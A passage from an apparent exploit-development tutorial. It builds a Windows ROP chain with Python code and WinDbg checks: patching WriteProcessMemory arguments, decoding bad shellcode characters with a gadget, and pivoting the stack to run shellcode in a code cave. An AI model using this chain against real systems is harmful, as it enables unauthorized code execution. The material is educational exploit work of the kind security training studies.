- finally use `mov` to move the results to edx and replace the dummy value 69696969 with the shellcode address
- Once that works, we have to increase the EDX by 4 to move to the next dummy value which is **0x6E6E6E6E** representing the **nSize**.

```python
print("[+] Patching lBuffer ...")
rop += pack('<L', 0x1012b413) # pop eax ; ret
rop += pack('<L', 0xfffffeff) # shellcode place - edx = valuate expression: 257 = 00000101
rop += pack('<L', 0x10104df6) # neg eax ; ret
rop += pack('<L', 0x1003f9f9) # add eax, edx ; retn 0x0004
rop += pack('<L', 0x1012d3ce) # mov dword [edx], eax ; ret
rop += b"A" * 4 # dummy for the retn
rop += pack('<L', 0x100bb1f4) # inc edx ; ret
rop += pack('<L', 0x100bb1f4) # inc edx ; ret
rop += pack('<L', 0x100bb1f4) # inc edx ; ret
rop += pack('<L', 0x100bb1f4) # inc edx ; ret
```

Let's verify it by going through the gadgets step by step:

Now EDX pointing to **6e6e6e6e** and `edx-4` has the address `01bb7539` which points to the shellcode

# Patching nSize

Patching **nSize** is very simple, pop the size of the shellcode in EAX, and after that replace **6e6e6e6e** with the right value.

The **6e6e6e6e** is replaced with **000000dc**

# Decoding badcharacters

## The charm behind decoding

The manual decoding and encoding algorithm that will be used here is very simple.
For now, this is manual, later more automatic applied algorithm will be used.

When there is a badcharacter, easily one of two things can be done, either add 1 to the badcharacter or subtract 1 from the badcharacter.

meaning in the shellcode the badcharacter is `0d` as in our case either you are going to add 1 to the `0d` making it `0e` or subtract 1 making it `0c`.

Now after sending the shellcode, the shellcode won't perform in the right way unless we change that character to its original state/value.

So using a gadget either subtract 1 from the new character or add 1. Again Simple Math!

in this case, I added 1 making the badcharacter `0e` and after using a gadget I will add `-1` resulting in reverting it back to the original value which is `0d`

So We need to pop `-1` in a register, However, I have to add only -1 byte to the badcharacter so  I need to find a gadget that adds only the low or high half of a register to another register that points to the badcharacter.

With that being said, I found the following gadget: 

```
0x101304f9: add byte [ecx], al ; ret
```

Adds the low byte of eax (`al`) to the byte at the memory address pointed to by ecx, and then returns. Since `al` will be `0xff` (from the 0xffffffff), this instruction increments the byte at [ecx] by 0xff, which is equivalent to decrementing it by 1.

## Find the troll [byte]

To get to the encoded badcharacter in the first place, you will have to do the following:

- Search for those bytes from shellcode `0e\x01\xc2\xeb\xf4`. Remember `0e` is `0d` after adding 1 to it.
- Start searching in the stack

```

0:012> r edx

Evaluate expression: 343 = 00000157
0:012> ? -0n343 
Evaluate expression: -343 = fffffea9
```

The difference between what edx points at and where is the shellcode is 343 decimal.
As usual, get the negative value and using `neg` instruction negate it again.

here is the decoding part of the exploit:

```python
print("[+] Start Decoding ....")
rop += pack('<L', 0x1012b413) # pop eax ; ret
rop += pack('<L', 0xfffffea9) # -0n343
rop += pack('<L', 0x10104df6) # neg eax ; ret
rop += pack('<L', 0x1003f9f9) # add eax, edx ; retn 0x0004
rop += pack('<L', 0x100baecb) # xchg eax, ecx ; ret
rop += b"A" * 4 # dummy for the retn
rop += pack('<L', 0x1012b413) # pop eax ; ret
rop += pack('<L', 0xffffffff) 
rop += pack('<L', 0x101304f9) # add byte [ecx], al ; ret
```


Let's verify it in windbg

All in this photo is already explained.

Here is where it's more interesting, since the gadget I found before is `add byte [ecx], al ; ret` so I need to move the value from EAX to ECX and also pop the `-1` or `0xffffffff` in EAX since `al` is the lower half of EAX.

Once the `ffffffff` is poped into EAX and the exploit reaches `add byte [ecx], al ; ret` you can notice `0e` right there.

Finally, checking ecx and it's `0d` now.

The decoding process is successful. 🥳

# Return to WPM

The final part of this long journey is return to WPM.

You will need to point back to the top of the skeleton which is the WriteProcessMemory function `76e10e10 KERNEL32!WriteProcessMemoryStub`

after that somehow push this to the stack, so the EIP execute it.

First, you have to calculate the difference from where edx is to where the top of the skeleton is.

I won't explain this since you did it multiple times through this journey. However it's the same process, search in stack for the top of the skeleton, calculate the difference between edx and where the top of the skeleton is.

After that it's the usual process, where you have to pop that offset in negative value in eax, here you won't negate it, finally add it to edx.

However the one thing extra here is how to put this on the top of the stack, easily I found the following gadget: `0x101394a9: xchg eax, esp ; ret`

```python
print("[+] Returning to WPM ...")
rop += pack('<L', 0x1012b413) # pop eax ; ret
rop += pack('<L', 0xffffffec) # edx - 0n20 hits WPM
rop += pack('<L', 0x1003f9f9) # add eax, edx ; retn 0x0004
rop += pack('<L', 0x101394a9) # xchg eax, esp ; ret
rop += b"A" * 4 # dummy for the retn
```

As usually, let's verify it in windbg:

![d5a41ff32f6031655fbba85ce6faa9e7.png](/assets/images/sbe_images/d5a41ff32f6031655fbba85ce6faa9e7.png)

Now reaching the `xchg` gadget.

Do the results in the blue box look familiar to you 😀 The only difference is this time the results are in the **ESP**.


## Verifying that WPM is writing

Once you reach WPM as in the images above, this means now it's executing the WPM.

Check the Code Cave first

Now use `pt`

Check the code cave again:

and VOALLLAA here is our shellcode:

This verifies that WPM Bypassing works just fine so far along with exploiting BoF ofcourse.
